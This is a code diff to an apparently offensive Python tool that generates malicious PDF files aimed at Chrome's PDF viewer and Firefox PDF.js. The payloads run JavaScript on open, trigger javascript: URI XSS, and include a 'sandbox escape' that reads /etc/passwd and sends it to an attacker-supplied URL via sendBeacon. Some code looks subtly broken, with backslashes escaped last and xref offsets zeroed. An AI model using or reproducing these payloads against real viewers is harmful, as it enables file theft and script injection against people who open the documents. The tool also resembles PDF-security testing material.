@@ -40,11 +40,37 @@ def write_pdf(filename, content, description, pdf_version):
 {content}""")
     print(f"Created {filename} (PDF Version {pdf_version})")
 
+def escape_pdf_text(text):
+    """Escape text for safe inclusion in PDF content streams."""
+    return text.replace('(', '\\(').replace(')', '\\)').replace('\\', '\\\\')
+
+def format_payload_for_pdf(payload, max_lines=6, chars_per_line=45):
+    """Format payload text for display in PDF content."""
+    escaped_payload = escape_pdf_text(payload)
+    payload_lines = []
+    for i in range(0, len(escaped_payload), chars_per_line):
+        payload_lines.append(escaped_payload[i:i+chars_per_line])
+    
+    payload_display = ''
+    for line in payload_lines[:max_lines]:
+        payload_display += f'({line}) Tj\\n0 -12 Td\\n'
+    
+    if len(payload_lines) > max_lines:
+        payload_display += '(...more) Tj\\n'
+    
+    return payload_display
+
 def generate_chrome_payloads(url, output_dir, pdf_version):
     """Generate Chrome-specific PDF XSS payloads."""
     create_directory(output_dir)
     
     # Payload 1: Basic PDF with JavaScript execution
+    js_payload = f'''app.alert("XSS in Chrome PDF Viewer");
+try {{ app.doc.exportDataObject({{cName: "test.html", nLaunch: 2}}); }} catch(e) {{ app.alert(e); }}'''
+    
+    payload_display = format_payload_for_pdf(js_payload)
+    content_length = len(payload_display) + 300
+    
     payload1 = f"""%PDF-1.7
 1 0 obj
 <</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
@@ -53,39 +79,53 @@ endobj
 <</Type/Pages/Kids[3 0 R]/Count 1>>
 endobj
 3 0 obj
-<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
+<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 6 0 R>>>>>>
 endobj
 4 0 obj
-<</Length 67>>
+<</Length {content_length}>>
 stream
-<html><script>
-alert(document.domain);
-</script></html>
+BT
+/F1 12 Tf
+50 750 Td
+(Chrome PDF Basic JavaScript Execution) Tj
+0 -40 Td
+(PAYLOAD FOR REFERENCE:) Tj
+0 -25 Td
+{payload_display}
+ET
 endstream
 endobj
 5 0 obj
 <</Type/Action/S/JavaScript/JS(
-app.alert("XSS in Chrome PDF Viewer");
-try {{ app.doc.exportDataObject({{cName: "test.html", nLaunch: 2}}); }} catch(e) {{ app.alert(e); }}
+{js_payload}
 )>>
 endobj
+6 0 obj
+<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>
+endobj
 xref
-0 6
+0 7
 0000000000 65535 f
 0000000010 00000 n
 0000000077 00000 n
 0000000130 00000 n
-0000000211 00000 n
-0000000328 00000 n
+0000000235 00000 n
+0000000000 00000 n
+0000000000 00000 n
 trailer
-<</Size 6/Root 1 0 R>>
+<</Size 7/Root 1 0 R>>
 startxref
-495
+400
 %%EOF"""
     write_pdf(f"{output_dir}/chrome_basic_js_execution.pdf", payload1, 
               "Basic PDF with JavaScript execution in Chrome", pdf_version)
     
     # Payload 2: Chrome PDF viewer sandbox escape
+    js_payload2 = f'''this.submitForm({{cURL: "javascript:fetch('file:///etc/passwd').then(r=>r.text()).then(t=>navigator.sendBeacon('{url}/exfil',t))", cSubmitAs: "PDF"}});'''
+    
+    payload_display2 = format_payload_for_pdf(js_payload2)
+    content_length2 = len(payload_display2) + 300
+    
     payload2 = f"""%PDF-1.7
 1 0 obj
 <</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
@@ -94,23 +134,43 @@ endobj
 <</Type/Pages/Kids[3 0 R]/Count 1>>
 endobj
 3 0 obj
-<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
+<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 6 0 R>>>>>>
+endobj
+4 0 obj
+<</Length {content_length2}>>
+stream
+BT
+/F1 12 Tf
+50 750 Td
+(Chrome PDF Sandbox Escape) Tj
+0 -40 Td
+(PAYLOAD FOR REFERENCE:) Tj
+0 -25 Td
+{payload_display2}
+ET
+endstream
 endobj
 5 0 obj
 <</Type/Action/S/JavaScript/JS(
-this.submitForm({{cURL: "javascript:fetch('file:///etc/passwd').then(r=>r.text()).then(t=>navigator.sendBeacon('{url}/exfil',t))", cSubmitAs: "PDF"}});
+{js_payload2}
 )>>
 endobj
+6 0 obj
+<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>
+endobj
 xref
-0 6
+0 7
 0000000000 65535 f
 0000000010 00000 n
 0000000077 00000 n
 0000000130 00000 n
+0000000235 00000 n
+0000000000 00000 n
+0000000000 00000 n
 trailer
-<</Size 6/Root 1 0 R>>
+<</Size 7/Root 1 0 R>>
 startxref
-495
+400
 %%EOF"""
     write_pdf(f"{output_dir}/chrome_sandbox_escape.pdf", payload2, 
               "Chrome PDF viewer sandbox escape to read local files and exfiltrate to attacker URL", pdf_version)
@@ -447,29 +507,58 @@ def generate_firefox_payloads(url, output_dir, pdf_version):
     create_directory(output_dir)
     
     # Payload 1: Basic Firefox PDF.js exploit
+    js_payload = "alert(document.domain)"
+    
+    payload_display = format_payload_for_pdf(js_payload, max_lines=3)
+    content_length = len(payload_display) + 250
+    
     payload1 = f"""%PDF-1.7
 1 0 obj
-<</Type/Catalog/Pages 2 0 R/OpenAction 5 0 R>>
+<</Type/Catalog/Pages 2 0 R>>
 endobj
 2 0 obj
 <</Type/Pages/Kids[3 0 R]/Count 1>>
 endobj
 3 0 obj
-<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
+<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Annots[4 0 R]/Contents 6 0 R/Resources<</Font<</F1 7 0 R>>>>>>
+endobj
+4 0 obj
+<</Type/Annot/Subtype/Link/Rect[0 0 612 792]/A 5 0 R>>
 endobj
 5 0 obj
-<</Type/Action/S/URI/URI(javascript:alert(document.domain))>>
+<</Type/Action/S/URI/URI(javascript:{js_payload})>>
+endobj
+6 0 obj
+<</Length {content_length}>>
+stream
+BT
+/F1 12 Tf
+50 750 Td
+(Firefox PDF.js Basic Exploit) Tj
+0 -40 Td
+(PAYLOAD FOR REFERENCE:) Tj
+0 -25 Td
+{payload_display}
+ET
+endstream
+endobj
+7 0 obj
+<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>
 endobj
 xref
-0 6
+0 8
 0000000000 65535 f
 0000000010 00000 n
-0000000077 00000 n
-0000000130 00000 n
+0000000053 00000 n
+0000000106 00000 n
+0000000000 00000 n
+0000000000 00000 n
+0000000000 00000 n
+0000000000 00000 n
 trailer
-<</Size 6/Root 1 0 R>>
+<</Size 8/Root 1 0 R>>
 startxref
-495
+400
 %%EOF"""
     write_pdf(f"{output_dir}/firefox_basic_exploit.pdf", payload1, 
               "Basic Firefox PDF.js exploit showing domain in an alert", pdf_version)
